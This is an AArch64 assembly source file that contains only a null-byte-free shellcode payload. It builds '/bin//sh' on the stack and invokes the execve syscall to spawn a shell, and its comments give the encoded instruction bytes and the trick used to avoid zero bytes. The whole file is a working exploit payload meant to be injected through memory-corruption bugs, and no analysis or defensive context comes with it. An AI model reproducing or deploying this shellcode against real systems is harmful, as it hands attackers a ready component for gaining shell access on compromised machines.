    .section .shcode, "ax", @progbits
    .align 2
    .global main
    .type main, %function
main:
    /* ca0b0162 */  eor     x2, x11, x11            /* x2 = 0 */
    /* d28c45e3 */  mov     x3, #0x622f
    /* f2adcd23 */  movk    x3, #0x6e69, lsl #16
    /* f2c5e5e3 */  movk    x3, #0x2f2f, lsl #32
    /* f2ed0e63 */  movk    x3, #0x6873, lsl #48    /* x3 = literal "/bin//sh" */
    /* a9bf0be3 */  stp     x3, x2, [sp,#-16]!
    /* 913333e3 */  add     x3, sp, #0xccc          /* Avoid zero byte in "mov x0, sp" */
    /* d1333060 */  sub     x0, x3, #0xccc          /* x0 = "/bin//sh" */
    /* d1337061 */  sub     x1, x3, #0xcdc          /* x1 = [x0, NULL] */
    /* a9bf0be0 */  stp     x0, x2, [sp,#-16]!
    /* d2801ba8 */  mov     x8, #0xdd               /* x8 = __NR_execve */
    /* d41b4061 */  svc     #0xda03                 /* syscall(x8, x0, x1, x2) */


/* Mark the stack as not executable */
    .section .note.GNU-stack, "", @progbits
